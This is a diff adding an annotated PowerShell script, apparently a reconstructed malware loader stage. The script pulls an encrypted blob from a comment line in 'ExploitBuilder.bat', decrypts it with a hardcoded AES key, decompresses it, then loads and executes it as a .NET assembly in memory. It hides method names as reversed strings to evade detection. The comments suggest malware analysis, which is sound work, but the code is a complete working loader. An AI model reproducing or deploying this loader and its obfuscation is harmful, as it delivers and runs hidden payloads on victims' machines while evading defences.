@@ -1,0 +1,45 @@
+## Read the initial payload file
+$payload = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('/ExploitBuilder.bat').Split([Environment]::NewLine);
+
+## Get the line starting with `:: `; This also acts as the comment in batch scripting
+foreach ($each_line in $payload) { 
+    if ($each_line.StartsWith(':: ')) {
+        $comment_line = $each_line.Substring(3);
+        break; 
+    }; 
+};
+
+## Decode the comment line with "Military grade AES encryption"
+$decoded_comment_line = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($comment_line);
+$cryptObj = New-Object System.Security.Cryptography.AesManaged;
+$cryptObj.Mode = [System.Security.Cryptography.CipherMode]::CBC;
+$cryptObj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
+$cryptObj.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=');
+$cryptObj.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('E55hmIoW8UIQx1ajzTvfAA==');
+$decryptObj = $cryptObj.CreateDecryptor();
+$decrypted_comment_line = $decryptObj.TransformFinalBlock($decoded_comment_line, 0, $decoded_comment_line.Length);
+$decryptObj.Dispose();
+$cryptObj.Dispose();
+
+## Shuffle the data throught memory streams and decompress it (gzip decompression)
+$decrypted_stream = New-Object System.IO.MemoryStream(, $decrypted_comment_line);
+$extra_stream = New-Object System.IO.MemoryStream;
+$ungzip_decrypted_stream = New-Object System.IO.Compression.GZipStream($decrypted_stream, [IO.Compression.CompressionMode]::Decompress);
+$ungzip_decrypted_stream.CopyTo($extra_stream);
+$ungzip_decrypted_stream.Dispose();
+$decrypted_stream.Dispose();
+$extra_stream.Dispose();
+
+
+## Dump exe file before loading and executing
+# $result = [System.Text.Encoding]::UTF8.GetString($extra_stream.ToArray())
+
+## Load the final binary and execute it
+$decrypted_array = $extra_stream.ToArray();
+$asm = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($decrypted_array);
+$asm_entrypoint = $asm.EntryPoint;
+$asm_entrypoint.Invoke($null, (, [string[]] ('%*')))
+
+
+
+
